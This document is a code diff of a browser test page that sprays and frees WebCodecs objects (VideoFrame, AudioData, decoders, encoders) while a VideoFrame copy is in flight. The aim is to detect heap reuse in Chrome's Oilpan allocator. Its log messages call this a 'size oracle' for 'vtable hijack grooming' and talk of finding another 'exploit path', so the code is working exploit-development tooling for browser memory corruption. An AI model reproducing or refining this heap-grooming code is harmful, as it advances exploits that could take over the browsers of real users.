@@ -5,24 +5,23 @@
 <div id="out"></div>
 <script>
 const log = s => { out.innerHTML += s + '<br>'; console.log(s); };
-log('Oilpan size oracle — finding 136-byte match');
+log('WebCodecs-only Oilpan arena test');
 log('');
 
-async function testObject(label, makeObj) {
+async function testObject(label, makeObjs, closeObj) {
     const canvas = new OffscreenCanvas(64, 64);
     const gl = canvas.getContext('webgl');
     gl.clearColor(1.0, 0.0, 0.0, 1.0);
     gl.clear(gl.COLOR_BUFFER_BIT);
     gl.finish();
 
-    // baseline
     const bf = new VideoFrame(canvas, {timestamp:0});
     const bb = new Uint8Array(bf.allocationSize());
     await bf.copyTo(bb); bf.close();
 
-    // free 3000 slots
-    const objs = [];
-    for (let i = 0; i < 3000; i++) objs.push(makeObj(i));
+    // allocate 2000 then free
+    const objs = await makeObjs(2000);
+    if (closeObj) objs.forEach(o => { try { closeObj(o); } catch(e){} });
     objs.length = 0;
 
     let groomed = 0;
@@ -32,86 +31,163 @@ async function testObject(label, makeObj) {
         const buf = new Uint8Array(f.allocationSize());
         const p = f.copyTo(buf);
         f.close();
-        const s = [];
-        for (let j = 0; j < 30; j++) s.push(makeObj(j));
+        // spray
+        const s = await makeObjs(30);
         await p;
+        if (closeObj) s.forEach(o => { try { closeObj(o); } catch(e){} });
         s.length = 0;
         if (buf.some((b,i) => b !== bb[i])) groomed++;
     }
 
-    const result = groomed + '/30';
-    log((groomed > 0 ? '[HIT] ' : '[ -- ] ') + label + ': ' + result);
+    log((groomed > 0 ? '[HIT] ' : '[ -- ] ') + label + ': ' + groomed + '/30');
     return groomed;
 }
 
 async function run() {
-    const ctx = new AudioContext();
+    const canvas2 = new OffscreenCanvas(4, 4);
+    const ctx2 = canvas2.getContext('2d');
+    ctx2.fillStyle = 'red';
+    ctx2.fillRect(0,0,4,4);
 
-    const tests = [
-        ['AudioParam',      i => ctx.createGain().gain],
-        ['TextDecoder',     i => new TextDecoder()],
-        ['TextEncoder',     i => new TextEncoder()],
-        ['DOMMatrix',       i => new DOMMatrix()],
-        ['DOMPoint',        i => new DOMPoint()],
-        ['DOMRect',         i => new DOMRect()],
-        ['AbortController', i => new AbortController()],
-        ['AbortSignal',     i => new AbortController().signal],
-        ['URL',             i => new URL('https://x.com/' + i)],
-        ['URLSearchParams', i => new URLSearchParams('a=' + i)],
-        ['Headers',         i => new Headers({'x-test': String(i)})],
-        ['Request',         i => new Request('https://x.com/' + i)],
-        ['MessageChannel',  i => new MessageChannel()],
-        ['MessagePort',     i => new MessageChannel().port1],
-        ['Blob',            i => new Blob(['x'.repeat(i % 64)])],
-        ['File',            i => new File(['x'], 'f'+i)],
-        ['FormData',        i => new FormData()],
-        ['EncodedAudioChunk', i => {
-            try {
-                return new EncodedAudioChunk({type:'key',timestamp:i,data:new Uint8Array(4)});
-            } catch(e) { return null; }
-        }],
-        ['AudioData',       i => {
-            try {
-                return new AudioData({format:'f32',sampleRate:44100,numberOfFrames:128,numberOfChannels:1,timestamp:i,data:new Float32Array(128)});
-            } catch(e) { return null; }
-        }],
-        ['VideoFrame canvas', i => {
+    // VideoFrame from canvas - creates VideoFrameHandle internally
+    await testObject(
+        'VideoFrame (canvas)',
+        async n => {
+            const arr = [];
+            for (let i=0;i<n;i++) {
+                const c = new OffscreenCanvas(4,4);
+                arr.push(new VideoFrame(c, {timestamp:i}));
+            }
+            return arr;
+        },
+        f => f.close()
+    );
+
+    // VideoFrame from ImageBitmap
+    await testObject(
+        'VideoFrame (ImageBitmap)',
+        async n => {
+            const bmp = await createImageBitmap(new ImageData(4,4));
+            const arr = [];
+            for (let i=0;i<n;i++) arr.push(new VideoFrame(bmp, {timestamp:i}));
+            return arr;
+        },
+        f => f.close()
+    );
+
+    // EncodedVideoChunk
+    await testObject(
+        'EncodedVideoChunk',
+        async n => {
+            const arr = [];
+            const d = new Uint8Array(16).fill(0x41);
+            for (let i=0;i<n;i++) arr.push(new EncodedVideoChunk({type:'key',timestamp:i,data:d}));
+            return arr;
+        },
+        null
+    );
+
+    // AudioData
+    await testObject(
+        'AudioData',
+        async n => {
+            const arr = [];
+            const d = new Float32Array(128);
+            for (let i=0;i<n;i++) {
+                try {
+                    arr.push(new AudioData({
+                        format:'f32', sampleRate:44100,
+                        numberOfFrames:128, numberOfChannels:1,
+                        timestamp:i, data:d
+                    }));
+                } catch(e) {}
+            }
+            return arr;
+        },
+        a => { try { a.close(); } catch(e){} }
+    );
+
+    // EncodedAudioChunk
+    await testObject(
+        'EncodedAudioChunk',
+        async n => {
+            const arr = [];
+            const d = new Uint8Array(8).fill(0x41);
+            for (let i=0;i<n;i++) {
+                try {
+                    arr.push(new EncodedAudioChunk({type:'key',timestamp:i,data:d}));
+                } catch(e) {}
+            }
+            return arr;
+        },
+        null
+    );
+
+    // VideoDecoder itself (GC'd object)
+    await testObject(
+        'VideoDecoder',
+        async n => {
+            const arr = [];
+            for (let i=0;i<n;i++) {
+                arr.push(new VideoDecoder({
+                    output: f => f.close(),
+                    error: ()=>{}
+                }));
+            }
+            return arr;
+        },
+        null
+    );
+
+    // AudioDecoder
+    await testObject(
+        'AudioDecoder',
+        async n => {
+            const arr = [];
+            for (let i=0;i<n;i++) {
+                arr.push(new AudioDecoder({
+                    output: a => a.close(),
+                    error: ()=>{}
+                }));
+            }
+            return arr;
+        },
+        null
+    );
+
+    // VideoEncoder
+    await testObject(
+        'VideoEncoder',
+        async n => {
+            const arr = [];
+            for (let i=0;i<n;i++) {
+                arr.push(new VideoEncoder({
+                    output: ()=>{},
+                    error: ()=>{}
+                }));
+            }
+            return arr;
+        },
+        null
+    );
+
+    // VideoFrame clone() - creates new VideoFrameHandle explicitly
+    await testObject(
+        'VideoFrame.clone()',
+        async n => {
             const c = new OffscreenCanvas(4,4);
-            const f = new VideoFrame(c, {timestamp:i});
-            return f;
-        }],
-        ['ImageData',       i => new ImageData(8, 8)],
-        ['ImageBitmap',     i => null], // async, skip
-        ['PerformanceMark', i => { try { return performance.mark('m'+i); } catch(e){return null;} }],
-        ['ReadableStream',  i => new ReadableStream()],
-        ['WritableStream',  i => new WritableStream()],
-        ['TransformStream', i => new TransformStream()],
-        ['EventTarget',     i => new EventTarget()],
-        ['CustomEvent',     i => new CustomEvent('x', {detail: i})],
-        ['MutationObserver',i => new MutationObserver(()=>{})],
-        ['IntersectionObserver', i => { try { return new IntersectionObserver(()=>{}); } catch(e){return null;} }],
-        ['ResizeObserver',  i => new ResizeObserver(()=>{})],
-    ];
-
-    let hits = [];
-    for (const [label, maker] of tests) {
-        try {
-            const groomed = await testObject(label, maker);
-            if (groomed > 0) hits.push(label);
-        } catch(e) {
-            log('[ EE ] ' + label + ': ' + e.message);
-        }
-    }
+            const base = new VideoFrame(c, {timestamp:0});
+            const arr = [];
+            for (let i=0;i<n;i++) arr.push(base.clone());
+            base.close();
+            return arr;
+        },
+        f => f.close()
+    );
 
     log('');
-    log('HITS: ' + (hits.length > 0 ? hits.join(', ') : 'none'));
-    if (hits.length > 0) {
-        log('These objects share 136-byte Oilpan bucket with VideoFrameHandle!');
-        log('Use them for vtable hijack grooming.');
-    } else {
-        log('No hits. VideoFrameHandle may be in a non-standard Oilpan arena.');
-        log('Try timing-based size oracle next.');
-    }
+    log('Done. If all 0, VideoFrameHandle is in its OWN private Oilpan arena.');
+    log('That means no JS object can groom it - need different exploit path.');
 }
 
 run().catch(e => log('ERR: ' + e));
